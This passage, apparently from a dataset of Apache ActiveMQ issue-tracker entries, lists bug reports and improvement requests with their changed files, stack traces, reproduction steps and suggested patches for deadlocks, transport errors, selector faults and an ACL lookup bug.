&#91;0x0000000040e82000..0x0000000040e82c30&#93;         at org.apache.activemq.MessageDispatchChannel.clear(MessageDispatchChannel.java:135)  waiting to lock <0x0000002b1771ddc0> (a java.lang.Object)        at org.apache.activemq.ActiveMQMessageConsumer.clearMessagesInProgress(ActiveMQMessageConsumer.java:546)         at org.apache.activemq.ActiveMQSession.clearMessagesInProgress(ActiveMQSession.java:524)         at org.apache.activemq.ActiveMQConnection.transportInterupted(ActiveMQConnection.java:1547)         at org.apache.activemq.transport.TransportFilter.transportInterupted(TransportFilter.java:100)         at org.apache.activemq.transport.TransportFilter.transportInterupted(TransportFilter.java:100)         at org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:236)         at org.apache.activemq.transport.failover.FailoverTransport.access$300(FailoverTransport.java:55)         at org.apache.activemq.transport.failover.FailoverTransport$1.onException(FailoverTransport.java:120)         at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:96)         at org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:147)         at org.apache.activemq.transport.InactivityMonitor.onException(InactivityMonitor.java:150)         at org.apache.activemq.transport.TransportSupport.onException(TransportSupport.java:97)         at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:150)         at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-1095
type:Bug
changed files:
texts:Invalid messages selected from durable topic
We think we"ve found an issue with durable topic subscriptions and message selectors.The attached application sends messages with an int property i with values 0..19 to a topic. We also have a durable subscription to the topic, selecting messages for which i%2=0. After sending the messages, the connection is started, allowing the consumer to receive the messages we"ve published that match the selection criterion. The second and every subsequent time we run the application, we see the following:message.i = 19message.i = 0message.i = 2message.i = 4message.i = 6message.i = 8message.i = 10message.i = 12message.i = 14message.i = 16message.i = 18message.i = 19 does not match the message selector criterion but it reaches our message handler anyway.Tested with ActiveMQ from trunk, revision 486090.
issueID:AMQ-1096
type:Bug
changed files:
texts:activemq-console only has limited classpath/extensions directory functionality
Reproduction:1) Untar the binary distribution.2) Run bin/activemq and note what logging looks like (you should see output to the console)3) Stop the broker.4) mv conf/log4j.properties foo/log4j.properties5) export CLASSPATH=/path/to/foo/6) export ACTIVEMQ_CLASSPATH=/path/to/foo/7) Run "./activemq --extdir /path/to/fooNow note there is no log output even though there are 3 different attempts to set the proper directory. This is a regression from 4.0 to 4.1.There are 2 root problems in Main.java. First, "classpaths" doesn"t actually pull from the classpath. The only thing that ever gets added to classpaths is the hard coded "conf" directory. Second, directories specified with --extdir have jars and zips added, but not the directories themselves.The attached patch totally removes the vestigial classpaths, and fixes extdir to pull in directories. This means that step 7 now works, but steps 5 and 6 are still useless. I like having only one way to specify classpath, but I could see others wanting the CLASSPATH and ACTIVEMQ_CLASSPATH settings to work.
issueID:AMQ-1097
type:Bug
changed files:ConfigUsingDestinationOptions.java
ActiveMQMessageConsumer.java
texts:Using a selector provides invalid output
When consuming messages with a selector, the consumer consumes invalid messages. (Both queue and topic).
issueID:AMQ-1098
type:Bug
changed files:HttpsTransportFactory.java
texts:Use of https transport throws ClassCastException
Trying to run the sample producer out of the main trunk using an https url throws a ClassCastException.  I"ve tracked this down in the code to the fact that HttpTransportFactory.java expects to find an HttpClientTransport but HttpsTransportFactory does not override createTransport() to create an HttpsClientTransport instead (HttpsClientTransport does not exist as a class).Thanks,Hernan$ ant producerBuildfile: build.xmlinit:compile:producer:     &#91;echo&#93; Running producer against server at $url = https://my.example.com:2222 for subject $subject = TEST.FOO     &#91;java&#93; Connecting to URL: https://my.example.com:7043     &#91;java&#93; Publishing a Message with size 1000 to topic: TEST.FOO     &#91;java&#93; Using non-persistent messages     &#91;java&#93; Sleeping between publish 0 ms     &#91;java&#93; javax.jms.JMSException: Could not create Transport. Reason: java.lang.ClassCastException: org.apache.activemq.transport.https.HttpsTransport     &#91;java&#93; Caught: javax.jms.JMSException: Could not create Transport. Reason: java.lang.ClassCastException: org.apache.activemq.transport.https.HttpsTransport     &#91;java&#93;     at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:33)     &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:229)     &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:242)     &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:211)     &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:158)     &#91;java&#93;     at ProducerTool.run(Unknown Source)     &#91;java&#93;     at ProducerTool.main(Unknown Source)     &#91;java&#93; Caused by: java.lang.ClassCastException: org.apache.activemq.transport.https.HttpsTransport     &#91;java&#93;     at org.apache.activemq.transport.http.HttpTransportFactory.compositeConfigure(HttpTransportFactory.java:62)     &#91;java&#93;     at org.apache.activemq.transport.TransportFactory.configure(TransportFactory.java:213)     &#91;java&#93;     at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:117)     &#91;java&#93;     at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:43)     &#91;java&#93;     at org.apache.activemq.transport.TransportFactory.connect(TransportFactory.java:77)     &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:227)     &#91;java&#93;     ... 5 moreBUILD SUCCESSFULTotal time: 2 seconds
issueID:AMQ-1099
type:Improvement
changed files:HttpClientTransport.java
HttpTransportSupport.java
texts:HttpClientTransport does not allow configuring http proxy host/port
Could not find a way to configure an http proxy host/port.  I am supplying a patch to allow this to be part of the options specified as part of the URI (e.g. http://my.server.com:3333/?proxyHost=my.proxy.com&proxyPort=4444)
issueID:AMQ-1103
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:Prefetch size < 0 should throw an exception somewhere or be defaulted, as messages are not dispatched anymore
None
issueID:AMQ-1106
type:Bug
changed files:PooledBrokerFactoryBean.java
texts:PooledBrokerFactoryBean incorrectly compares broker config resources
None
issueID:AMQ-1107
type:Bug
changed files:
texts:Upgrade to xbean 2.8 to fix invalid generated schemas
None
issueID:AMQ-1108
type:Bug
changed files:PrefetchSubscription.java
texts:Deadlock in PrefetchSubscription
see: http://www.nabble.com/Another-deadlock-showing-up-tf2874106.html#a8033006The deadlock is as follows:Found one Java-level deadlock:============================="ActiveMQ Task":  waiting to lock monitor 0x080e4f3c (object 0x92b60db0, ajava.util.LinkedList),  which is held by "ActiveMQ Transport: tcp:///127.0.0.1:37496""ActiveMQ Transport: tcp:///127.0.0.1:37496":  waiting to lock monitor 0x080e4f7c (object 0x92b60d98, aorg.apache.activemq.broker.region.cursors.VMPendingMessageCursor),  which is held by "ActiveMQ Task"Java stack information for the threads listed above:==================================================="ActiveMQ Task":        atorg.apache.activemq.broker.region.PrefetchSubscription.dispatch(PrefetchSubscription.java:414) waiting to lock <0x92b60db0> (a java.util.LinkedList)        atorg.apache.activemq.broker.region.QueueSubscription.dispatch(QueueSubscription.java:172)        atorg.apache.activemq.broker.region.PrefetchSubscription.dispatchMatched(PrefetchSubscription.java:397) locked <0x92b60d98> (aorg.apache.activemq.broker.region.cursors.VMPendingMessageCursor)        atorg.apache.activemq.broker.region.PrefetchSubscription.onDispatch(PrefetchSubscription.java:451)        atorg.apache.activemq.broker.region.QueueSubscription.onDispatch(QueueSubscription.java:192)        atorg.apache.activemq.broker.region.PrefetchSubscription$3.run(PrefetchSubscription.java:429)        atorg.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:778)        atorg.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:791)        atorg.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:111)        atorg.apache.activemq.thread.PooledTaskRunner.access$100(PooledTaskRunner.java:26)        atorg.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:44)        atjava.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)        atjava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)        at java.lang.Thread.run(Thread.java:595)"ActiveMQ Transport: tcp:///127.0.0.1:37496":        atorg.apache.activemq.broker.region.PrefetchSubscription.dispatchMatched(PrefetchSubscription.java:383) waiting to lock <0x92b60d98> (aorg.apache.activemq.broker.region.cursors.VMPendingMessageCursor)        atorg.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:219) locked <0x92b60db0> (a java.util.LinkedList)        atorg.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:299)        atorg.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:397)        atorg.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:177)        atorg.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)        atorg.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)        atorg.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:88)        atorg.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:491)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:179)        atorg.apache.activemq.broker.TransportConnection.service(TransportConnection.java:287)        atorg.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)        atorg.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65)        atorg.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:133)        atorg.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)        atorg.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        atorg.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137)        at java.lang.Thread.run(Thread.java:595)Found 1 deadlock.
issueID:AMQ-1110
type:Bug
changed files:
texts:JMS to JMS Bridge fails with Number format exception on physical name
Maybe this is just some missconfiguration from my site but ...I"m trying to use activemq to integrate some c++ code with the j2ee world. My task is to forward messages generated on the c++ side to the JMS of Bea Weblogic 8.1. ActiveMQ is running outside the WLS in a separate process. The startup looks fine as the wls context can be used to get references to the ConnectionFactory and the configured test destination WLSTestQ. On sending a message to the local queue of the bridge i get the following stacktrace: java.lang.NumberFormatException: For input string: "WLSTESTQ"at java.lang.NumberFormatException.forInputString(NumberFormatException.java:48)at java.lang.Integer.parseInt(Integer.java:447)at java.lang.Integer.parseInt(Integer.java:497)at org.apache.activemq.command.ActiveMQTempDestination.setPhysicalName(ActiveMQTempDestination.java:66)at org.apache.activemq.command.ActiveMQDestination.<init>(ActiveMQDestination.java:142)at org.apache.activemq.command.ActiveMQTempDestination.<init>(ActiveMQTempDestination.java:38)at org.apache.activemq.command.ActiveMQTempQueue.<init>(ActiveMQTempQueue.java:36)at org.apache.activemq.command.ActiveMQDestination.transform(ActiveMQDestination.java:107)at org.apache.activemq.command.ActiveMQMessage.setJMSDestination(ActiveMQMessage.java:219)at weblogic.jms.client.JMSProducer.sendInternal(JMSProducer.java:428)at weblogic.jms.client.JMSProducer.send(JMSProducer.java:152)at weblogic.jms.client.JMSProducer.send(JMSProducer.java:215)at org.apache.activemq.network.jms.QueueBridge.sendMessage(QueueBridge.java:87)at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:134)at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:840)at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:96)at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:165)at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:88)at org.apache.activemq.thread.DedicatedTaskRunner.access$000(DedicatedTaskRunner.java:25)at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:39)ERROR DestinationBridge - failed to forward message on attempt: 1 reason: java.lang.NumberFormatException: For input string: "WLSTESTQ" message: ActiveMQTextMessage {commandId = 14, responseRequired = false, messageId = ID:KStanke-1523-1167310376227-0:0:1:1:10, originalDestination = null, originalTransactionId = null, producerId = ID:KStanke-1523-1167310376227-0:0:1:1, destination = queue://TEST.FOO, transactionId = null, expiration = 0, timestamp = 1167310385795, arrival = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null,compressed = false, userID = null, content = null, marshalledProperties = null,dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, readOnlyProperties = true, readOnlyBody = true, droppable = false, text = Message: 9 sent at: Thu Dec 28 13:53:05 CET 2006&#91;Skipped some blank lines&#93;}I"m using the message producer from the example to test the routing to wls JMS.  I also attached my activemq.xml configuration for you reference.
issueID:AMQ-1112
type:Bug
changed files:
texts:remove expired messages from Store and update Message cursors
Ensure messages that are expired are removed from message store and message cursrors are also updated consistently
issueID:AMQ-1113
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:ActiveMQConsumer can catch an error in dispatch but logs it as a warning
None
issueID:AMQ-1116
type:Bug
changed files:FailoverTransport.java
ConnectionPool.java
texts:deadlock when shutting down client that is configured with failover=true and is presently disconnected from broker
Sounds like a great idea to me  Please go ahead and submit a jira with the patch and we"ll get it integrated ASAPOn 1/4/07, Chris Hofstaedter <chrish@nmwco.com> wrote:> I ran into this issue as well on <= 4.0.2.  I never tested it against> 4.1.    The FailoverTransport doesn"t shutdown if it is disconnected at> the time of the shutdown.>> I believe that the root cause is in the > FailoverTransport.oneway(Command> command) function which will hold onto the command and keep trying to> reconnect until the message is sent or the transport is disposed.>> I applied a local patch that seems to solve the problem.  Note that > I"ve only tested the patch against 4.0.2.>> Specifically, I early return from the oneway function if the command > is ShutdownInfo and the connectedTransport is null.  This seems to > solve the problem in that I get clean shutdowns on the client when > failover is true and the client is presently disconnected.>> Does this seem like a reasonable patch?  Should I create a JIRA with > this info?>>>> ----Original Message----> From: James Strachan james.strachan@gmail.com> Sent: Tuesday, December 12, 2006 4:46 AM> To: activemq-users@geronimo.apache.org> Subject: Re: failover mode and client shutdown>> There could be a bug relating to closes with the failover transport > possibly, but the ActiveMQConnection does wait up to the closeTimeout > for a close to succeed before shutting down - so you could try reduce > the timeout.>> http://incubator.apache.org/activemq/maven/activemq-core/apidocs/org/a> pa> che/activemq/ActiveMQConnection.html#setCloseTimeout(int)>>> On 12/12/06, Keith Irwin <keith.irwin@gmail.com> wrote:> > Folks--> >> > When we have clients running and we take down AMQ (<= 4.1.0), then > > attempt to shutdown the clients with Control-C (rather than kill the > > JVM with a -9), the clients won"t shut down.  It"s as if a "close" > > on the failover connection never reaches the amq client classes.> >> > I note that in the 4.1.0 release notes, this issue is referenced, > > and the advice is to set the maxReconnectAttempts (or similar) > > property to something non-zero.> >> > The problem is that we don"t want there to be a max number of > > attempts.  Unless we specifically want to take down the client (say, > > for an apt-get package upgrade), we want it to keep on trying > > forever.> >> > SO, my question: Is there an architectural reason for not being able > > to close a failover connection if AMQ is down?> >> > If it isn"t impossible due to tradeoffs elsewhere in the code base, > > we might be willing to submit a patch to fix the issue.> >> > Our only other recourse is to attempt to close the connections in > > separate threads, then timeout those threads after a while and fall > > out the end of the java process.> >> > For instance:> >> >   Thread th = new Thread(new Runnable() {> >       public void run() {> >          connection.close();> >       }> >    });> >    th.start();> >> >    // give up after 2 seconds> >    Thread.currentThread().join(2000);> >> > I guess this is do-able, but it seems, you know, some how, well,> wrong.> >> > So, is it worth investigating a patch to AMQ?> >> > Keith> >
issueID:AMQ-1117
type:Wish
changed files:DemandForwardingBridgeSupport.java
texts:It would be helpful if some of the log messages that are logged at higher severity levels than they are presently
It would be helpful if the messages pertaining to transport interrupted and transport resumed were logged at INFO rather than DEBUG.It would be helpful if the messages pertaining to security errors were logged at ERROR rather than INFO.All of these log messages are in DemandForwardingBridgeSupport in the following functions:public void start() // for Transport Interruptedpublic void start() // for Transport Resumedprotected void serviceRemoteException() // for Security errors
issueID:AMQ-1119
type:Bug
changed files:MutexTransport.java
texts:Deadlock in MutexTransport on shutdown with high volume of messages
I ran into a deadlock in the MutextTransport.oneway(Command command) function when processing very high message volume (100% cpu utilization) at the time of a shutdown.  I"m running 4.0.2 on WinXP and within a demand forwarding environment with failover = true.I did trap this deadlock in the debugger and it looks like two commands are crossing paths in opposite directions through the MutexTransport. One of the commands is a MessageDispatch and the other is a ShutdownInfo.  Now, when the ShutdownInfo gets through the MutexTransport first, it tries to shutdown the background thread of the TcpTransport.  However, this thread is currently servicing the MessageDispatch and is blocked on the MutexTransport.  Deadlock.So, my patch was simply to avoid entering the synchronized(writeMutex) block in the oneway(Command command) function of MutexTransport ifcommand.isShutdownInfo() returns true:if (command.isShutdownInfo())   next.oneway(command);else   synchronized(writeMutex)  {      next.oneway(command);   }
issueID:AMQ-1121
type:Bug
changed files:
texts:Kaha DB hangs on restart
I run a bunch or messages through AMQ, then restarted AMQ and it hangs. Following are the last messages that I see. AMQ is not listening on the configured port.2007-01-06 01:35:29,723 &#91;main           &#93; DEBUG DataManager                    - End of data file reached at (header was invalid): offset = 810, file = 1, size = 2192007-01-06 01:35:29,754 &#91;JMX connector  &#93; INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:11099/jmxrmi2007-01-06 01:35:32,660 &#91;main           &#93; DEBUG DataManager                    - End of data file reached at (header was invalid): offset = 88244949, file = 5, size = 100856
issueID:AMQ-1128
type:Bug
changed files:VMTransportFactory.java
texts:create=false for vm://localhost causes Exception
When setting create=false in ActiveMQConnectionFactory.brokerUrl, the VMTransportFactory"s doCompositeConnect method fails with:Invalid connect parameters: {create=false}Removing this option from the options map when retrieving it fixes this bug.  Patch attached.
issueID:AMQ-1130
type:Bug
changed files:MySqlJDBCAdapter.java
texts:MySql should use LONGBLOB rather than BLOB for persisting messages to avoid the 64k limit
None
issueID:AMQ-1132
type:Bug
changed files:pom.xml
JournalRWPerfTool.java
JournalPerfTool.java
texts:activeio test package inclusion and logging properties
When you include activemq-core as a dependency on an empty project, even simplest examples fails withjava.io.FileNotFoundException: /target/test.log (No such file or directory)exception.First of all, the core package includes dependency on activeio-core test jar     <dependency>      <groupId>${pom.groupId}</groupId>      <artifactId>activeio-core</artifactId>      <optional>false</optional>      <type>test-jar</type>    </dependency>for which I"m not sure is needed.Second, in this test activeio package logging.properties is configured so that root logger writes into ${basedir}/target/test.log, which causes application to fail. It would be better to set it to write to stdout by default.
issueID:AMQ-1134
type:Bug
changed files:
texts:stomp connections in the broker don&#39;t get cleared up if the socket dies
it looks like there"s a bug causing the connection to keep around
issueID:AMQ-1140
type:Bug
changed files:
texts:Compression not working
When setting compression from the message producer side using the ActiveMQConnectionFactory.setUseCompression(true) method, a call to the ActiveMQConnectionFactory.isUseCompression() method then returns true. However, when using Ethereal to sniff the packets between brokers, the message bodies are not compressed - they"re just plain text. This appears to be a bug. I"ll try to create a test for this.
issueID:AMQ-1142
type:Bug
changed files:
texts:TemporaryQueue communication not working
Assume a (old legacy, yes this is out of date and better solutions are available) point to point architecture:Client creates temporary queues and send the queuename to the server by a fixed queue ("command queue")Server uses the received queue names to send messages to the client.See the attached Code snippets: Start the Server Start the Client The Client creates a temporary queue and sends the name to the server Server receives message and sends a test message back. Client NEVER receives the test messageThis works 100% on IBM MQSeries (the only source diff is the line that has a MQSerie getQueue API call, instead a createQueue, because queus are defined, and not dynamical as in ActiveMQ)ActiveMQ LOG information:The temporary queue is logged, but later it says that there are no subscriptions(..)DEBUG AbstractRegion                 - Adding destination: topic://ActiveMQ.Advisory.Consumer.Queue.ID:TIGER-2615-1170064714906-1:0:1DEBUG JournalPersistenceAdapter      - Checkpoint done.DEBUG TIGER-2615-1170064714906-1:0:1 - No subscriptions registered, will not dispatch message at this time.(...)Can this bug be fixed?Thank you, Jos
issueID:AMQ-1146
type:Bug
changed files:InactivityMonitor.java
texts:InactivityMonitor: Transport connection disconnected "Channel was inactive for too long."
Sometimes (when the transport is idle for long) the transport gets disconnected with the message "Channel was inactive for too long."         Apparently this is same as reported in http://www.nabble.com/Channel-was-inactive-for-too-long-t1463069.html#a3971744 and http://www.nabble.com/Durable-consumer-reconnect-problem-tf1716817.html#a6147014 Version: 4.1 Background:         The class org.apache.activemq.transport.InactivityMonitor runs monitoring threads to check the read and write of the transport(TCP for example). If it hasn"t sent the message during the given period, it sends a KeepAliveInfo to ensure the connectivity. If it doesn"t receive the message for a given duration, then it disconnects the transport.         By default, the maximumInactivityDuration is 30000 milliseconds. This is the time interval between the check for read. That is if an end of the transport doesn"t receive any message for this period, then it will close the connection. For the read check, the time interval is half of maximumInactivityDuration i.e. 15000 millisecond. That is if a message was not sent during this period, it will send a KeepAliveInfo to ensure the connectivity. Problem and the recommended fix:         The InactivityMonitor class uses the flags inReceive and commandReceived variables in methods readCheck and onCommand. Typically these two methods are called from different threads. Also, the flags inSend and commandSent are used in methods oneway and writeCheck. Again these two methods are called from different threads. But, the synchronization was missing for these. This seems to be a potential cause for the problem. So, synchronization has been incorporated for these flag usages.         The same class InactivityMonitor is used at both client and server side. In general, the write check (which sends KeepAliveInfo) happens twice during the time when the read check happens once. Probably the client and server machines have performance differences and just to be safer, now the write check is made to happen thrice during the time when the read check happens once.         The original and the changed source files are attached here. http://www.nabble.com/file/5958/InactivityMonitor_changed.javahttp://www.nabble.com/file/5957/InactivityMonitor_Original.java
issueID:AMQ-1147
type:Bug
changed files:MessageResourceAdapter.java
ServerSessionPoolImpl.java
ActiveMQEndpointWorker.java
MessageActivationSpec.java
ActiveMQManagedConnectionFactory.java
ActiveMQEndpointActivationKey.java
ActiveMQResourceAdapter.java
ActiveMQActivationSpec.java
texts:Spring AspectJ autoproxying breaks ActiveMQManagedConnectionFactory injection
The cast to the concrete class at ActiveMQManagedConnectionFactory:50 fails:    public void setResourceAdapter(ResourceAdapter adapter) throws ResourceException {        this.adapter = (ActiveMQResourceAdapter) adapter;org.springframework.beans.TypeMismatchException: Failed to convert property value of type &#91;$Proxy63&#93; to required type &#91;javax.resource.spi.ResourceAdapter&#93; for property "resourceAdapter"; nested exception is java.lang.ClassCastException: $Proxy63 cannot be cast to org.apache.activemq.ra.ActiveMQResourceAdapterCaused by: java.lang.ClassCastException: $Proxy63 cannot be cast to org.apache.activemq.ra.ActiveMQResourceAdapter    at org.apache.activemq.ra.ActiveMQManagedConnectionFactory.setResourceAdapter(ActiveMQManagedConnectionFactory.java:50)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)    at java.lang.reflect.Method.invoke(Method.java:597)    at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:786)&#91;...&#93;Spring (2.0.3 build 66) config: <aop:aspectj-autoproxy /> <aop:spring-configured /> <bean id="jms.managedConnectionFactory" class="org.apache.activemq.ra.ActiveMQManagedConnectionFactory">  <property name="resourceAdapter">   <ref local="jms.resourceAdapter" />  </property> </bean> <bean id="jms.resourceAdapter" class="org.apache.activemq.ra.ActiveMQResourceAdapter">  <property name="serverUrl">   <value>${amq.serverUrl}</value>  </property> </bean>There"s probably a workaround for this, but it"s still annoying.
issueID:AMQ-1151
type:Improvement
changed files:
texts:include the activemq-xmpp jar in the binary distro
None
issueID:AMQ-1152
type:Bug
changed files:
texts:ActiveMQ connectionFactory ignores redeliveryPolicy
Run mvn -Dtest=JmsTest test in the attached sample application.Redelivery is ignored and failed messages will not stop redelivering.
issueID:AMQ-1156
type:Bug
changed files:TcpTransport.java
WireFormatNegotiator.java
texts:option "wireFormat.tcpNoDelayEnabled=true" is ignored
A. DescriptionSetting the wireFormat.tcpNoDelayEnabled flag to true in connection uri"s (for example "tcp://localhost:61616?wireFormat.tcpNoDelayEnabled") has no effect:The sockets created in ActiveMQ do not have the TcpNoDelay flag set to true.You can verify this for example in the following way: insert the line System.err.println(sock.getTcpNoDelay()); at the end of the methodorg.apache.activemq.transport.tcp.TcpTransport.initialiseSocket.Also you can try my test at http://www.nabble.com/High-latency-for-small-messages-problem-t3159901.html which makes latency appear if Nagle"s algorithm is not disabled.This affects versions 4.0, 4.1.0, and 4.2.0 latest snapshot. I guess 4.0.2 is affected too.B. ReasonAfter looking at the source code to understand how the options are set, i saw that in the method org.apache.activemq.transport.tcp.TcpTransportFactory.compositeConfigure the following line appears:Map socketOptions = IntrospectionSupport.extractProperties(options, "socket."); and also that the method to set the TcpNoDelay option in class org.apache.activemq.transport.tcp.TcpTransport is called setTcpNoDelay and not setTcpNoDelayEnabledTherefore, I tried to write "socket.tcpNoDelay=true" instead of "wireFormat.tcpNoDelayEnabled=true" and it worked! This is a workaround.But, "wireFormat.tcpNoDelayEnabled" option is not refused (as "wireFormat.tcpNoDelayTypoEnabled" would be). The option "tcpNoDelay=true" is not refused either, but DOES NOT work either.C. FixSo, please, for the sake of the poor soul who"s next going to try to disable Nagle"s algorithm without noticing any effect, and will start looking for the problem elsewhere (and for the sake of consistency also):-Either change the documentation (http://www.activemq.org/site/tcp-transport-reference.html and http://www.activemq.org/site/configuring-wire-formats.html) to say that one should use the socket.tcpNoDelay option, or-Change the code to obey the documentation (and make it refuse old options like just "tcpNoDelay" who have no effect).Personally I would change the documentation ASAP so that people know about the "socket.tcpNoDelay=true" workaround until next version, and then change the code to recognize the "wireFormat.tcpNoDelayTypoEnabled" option. I"d like to point out that the own ActiveMQ test cases use "wireFormat.tcpNoDelayTypoEnabled" .D. Related issuesThis is related to a previous post of mine: http://www.nabble.com/High-latency-for-small-messages-problem-t3159901.htmlDoing quick synchronized sends showed a 39ms latency if the broker is running in Linux, and a 200ms latency if the broker is in Windows (by the way, if someone knows the bottom reason for this exact latency times, please tell me). Putting the "wireFormat.tcpNoDelayTypoEnabled" to true in order to disable Nagle"s algorithm had no effect (because ActiveMQ does not recognize it).Very probably this is also related to issues https://issues.apache.org/activemq/browse/AMQ-1143 and https://issues.apache.org/activemq/browse/AMQ-1137 (in this one probably Helmutt tried to set the wireFormat.tcpNoDelayTypoEnabled without success because of this).
issueID:AMQ-1157
type:New Feature
changed files:AuthorizationBroker.java
BrokerService.java
SecurityContext.java
texts:startup destinations don&#39;t work when using a security policy
we need a special "broker" security context which is able to create new destinations on startup etc.
issueID:AMQ-1159
type:Bug
changed files:
texts:Update scm in pom.xml to point to new repository.
scm of pom.xml still points to incubator.
issueID:AMQ-1160
type:Improvement
changed files:AbstractDeadLetterStrategy.java
MutableBrokerFilter.java
RegionBroker.java
TimeStampingBrokerPlugin.java
TopicSubscription.java
Topic.java
Queue.java
ActiveMQMessageConsumer.java
TransportConnection.java
Broker.java
ActiveMQConnectionMetaData.java
ErrorBroker.java
Message.java
EmptyBroker.java
BrokerFilter.java
UDPTraceBrokerPlugin.java
PrefetchSubscription.java
MasterBroker.java
texts:provide a way of setting the timeToLive from the point in time the message is received by the broker to avoid clock sync issues
The JMS default is to use timeToLive relative to the client send; which means things get converted to GMT and can suffer from clock sync issues.A useful alternative could be to set the timeToLive on a message relative to the broker"s clock when it receives it. That way there"s no need to rely on a properly sync"d clock.So we could either  use a new header - ActiveMQBrokerTimeToLive or something. use a negative time to live value to indicate, its the time to live relative to the broker (rather than relative to the client)Am wondering if the negative timeToLive value would break any existing software? (Currently we tend to ignore any TTL values less than or equal to zero)
issueID:AMQ-1161
type:Bug
changed files:
texts:PooledConnectionFactory / PooledSession generates UnsupportedOperationException when publishing to a topic
PooledSession does not appear to use the Topic supplied to the createPublisher(topic) method. When the publish(Message) method is called on the returned TopicPublisher instance, an UnsupportedOperationException is thrown ("A destination must be specified.").Some simple digging turns up the fact that the ActiveMQTopicPublisher instance nested inside PooledTopicPublisher gets initialized with a ProducerInfo whose destination is null. Looks like PooledSession.getTopicPublisher() is responsible for creating the publisher from the contained ActiveMQSession, but does not supply a destination (explicitly passes null).Sample code to recreate issue (also attached is Junit test case):  ActiveMQTopic topic = new ActiveMQTopic("test");  PooledConnectionFactory pcf = new PooledConnectionFactory();  pcf.setConnectionFactory(new ActiveMQConnectionFactory("vm://test"));  TopicConnection conn = (TopicConnection)pcf.createConnection();  TopicSession session = conn.createTopicSession(false, Session.AUTO_ACKNOWLEDGE);  TopicPublisher publisher = session.createPublisher(topic);  publisher.publish(session.createMessage());
issueID:AMQ-1163
type:Bug
changed files:AuthorizationBroker.java
texts:bug in reading temp queue using the tempDestinationAuthorizationEntry  feature
> Folks,>> I"ve been trying to use the tempDestinationAuthorizationEntry feature in 4.2> and I think I"ve found a problem. If I set up a consumer of the temp queue> and add it to the read permission, it always reports that I don"t have> permission to read the queue. However, if I add that consumer to the write> permission on the queue it works like a charm.>> Looking at the source I think I have discovered a bulk copy/paste problem.> If you look at> org.apache.activemq.security.AuthorizationBroker.addConsumer() in the source> trunk, you will see this little piece of code a couple of lines from the top> of the method:>>         if(!info.getDestination().isTemporary()) {>             allowedACLs => authorizationMap.getReadACLs(info.getDestination());>         }else {>          allowedACLs = authorizationMap.getTempDestinationWriteACLs();>         }>> Note that it gets the TempDestinationWriteACLs(), even though if we are not> a temp queue it gets the ReadACLs().  If you look in addProducer() you can> see a similar piece of code that might be where this copy originated.>> I am using what looks to be the latest 4.2 SNAPSHOT (file:> apache-activemq-4.2-20070214.034812-3.zip).>>    lorne
issueID:AMQ-1165
type:Bug
changed files:
texts:RegionBroker resets JMS Timestamp
